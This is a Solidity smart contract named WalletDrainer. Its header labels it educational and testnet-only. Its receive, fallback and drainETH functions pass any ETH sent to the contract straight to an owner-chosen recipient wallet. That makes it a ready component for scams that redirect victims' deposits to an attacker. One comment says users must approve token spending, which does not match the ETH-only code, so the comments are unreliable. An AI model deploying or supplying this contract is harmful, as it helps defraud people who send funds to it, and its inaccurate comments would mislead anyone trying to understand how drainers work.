// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title WalletDrainer
 * @dev Educational contract demonstrating how malicious contracts can drain wallets
 * WARNING: FOR EDUCATIONAL/TESTNET USE ONLY
 */
contract WalletDrainer {
    address payable public owner;
    address payable public recipientWallet;
    
    event FundsReceived(address indexed from, uint256 amount);
    event FundsDrained(address indexed from, address indexed to, uint256 amount);
    event RecipientUpdated(address indexed newRecipient);
    
    constructor(address payable _recipientWallet) {
        owner = payable(msg.sender);
        recipientWallet = _recipientWallet;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this");
        _;
    }
    
    /**
     * @dev Update the recipient wallet address
     */
    function setRecipient(address payable _newRecipient) external onlyOwner {
        require(_newRecipient != address(0), "Invalid address");
        recipientWallet = _newRecipient;
        emit RecipientUpdated(_newRecipient);
    }
    
    /**
     * @dev Receive function - automatically drains any ETH sent to contract
     */
    receive() external payable {
        emit FundsReceived(msg.sender, msg.value);
        _drainFunds();
    }
    
    /**
     * @dev Fallback function
     */
    fallback() external payable {
        emit FundsReceived(msg.sender, msg.value);
        _drainFunds();
    }
    
    /**
     * @dev Main draining function - sends all ETH to recipient
     */
    function _drainFunds() private {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool success, ) = recipientWallet.call{value: balance}("");
            require(success, "Transfer failed");
            emit FundsDrained(msg.sender, recipientWallet, balance);
        }
    }
    
    /**
     * @dev Public function to drain a specific amount
     * User must approve this contract to spend their tokens first
     */
    function drainETH() external payable {
        require(msg.value > 0, "Must send ETH");
        emit FundsReceived(msg.sender, msg.value);
        _drainFunds();
    }
    
    /**
     * @dev Emergency withdraw (owner only)
     */
    function emergencyWithdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "Withdraw failed");
    }
    
    /**
     * @dev Get contract balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
